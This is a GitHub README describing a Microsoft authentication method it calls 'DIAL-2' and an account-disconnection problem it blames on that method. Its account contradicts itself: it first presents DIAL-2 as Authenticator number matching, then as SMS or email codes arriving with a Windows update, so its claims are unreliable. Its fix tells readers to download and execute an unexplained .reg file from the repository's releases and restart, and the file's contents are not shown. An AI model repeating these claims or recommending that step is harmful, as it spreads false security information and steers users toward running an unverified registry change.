![image](https://github.com/Dixel1/Fix-Microsoft-New-Authentication-Methode-DIAL-2-/assets/63664894/28069c01-3074-448f-acf1-552e841ea94d)# Fix-Microsoft-New-Authentication-Methode-DIAL-2-

## What's DIAL-2 authentication methode
Okay, first of all, let's compare the new authentication method from Microsoft called DIAL-2 with the traditional two-step verification method that uses push notifications or verification codes in the Authenticator app.

The traditional method consists of asking the user to provide a second authentication factor in addition to their password to access a website, an application or a network. This second factor can be a push notification that the user has to approve on their phone, or a verification code that the user has to enter on the login screen. The user must have installed the Authenticator app on their phone and have configured their account to use this method.

The DIAL-2 method is an improvement of the traditional method that adds an extra layer of security by asking the user to match a number displayed on the login screen with a number displayed on the push notification or the verification code. This number changes with each login attempt and prevents phishing or replay attacks. The user has to press the Approve button only if the numbers match, otherwise they have to press the Deny button.

The DIAL-2 method is enabled for all push notifications and verification codes from the Authenticator app starting from May 8, 2023. The services compatible with this method are Azure Active Directory, Microsoft 365, Outlook.com, Skype, OneDrive, Xbox Live and others. To use this method, the user must have installed the latest version of the Authenticator app on their phone and have configured their phone number or office phone as a verification method.

The DIAL-2 method offers a safer and simpler login experience for users, while reducing the risks of account compromise. To learn more about this method, visit https://learn.microsoft.com/en-us/azure/active-directory/authentication/how-to-mfa-number-match.

## DIAL-2 authentication problem
Since the beginning of September, many Windows users have been complaining about the unexpected disconnection of their Microsoft accounts. This problem affects online services such as OneDrive, Outlook or Skype, but also personal settings and software licenses. According to Microsoft, the cause of this malfunction would be related to the DIAL-2 method, a new authentication system introduced with the latest Windows update. This method aims to strengthen the security of accounts by using a one-time code sent by SMS or email. However, it seems that this method is too sensitive and that it detects minor changes in hardware or network as hacking attempts. Microsoft is currently working to solve this problem and advises affected users to manually reconnect to their accounts using the DIAL-2 code.


## How to solve it
- First, download ```Activation new authentication methode (DIAL) (2).reg``` file in releases pannel
  ![image](https://github.com/Dixel1/Fix-Microsoft-New-Authentication-Methode-DIAL-2-/assets/63664894/f50be0f0-1482-47df-82c7-9db5c3e464ca)

- Execute ```Activation new authentication methode (DIAL) (2).reg```
- Restart your computer
- Enjoy !
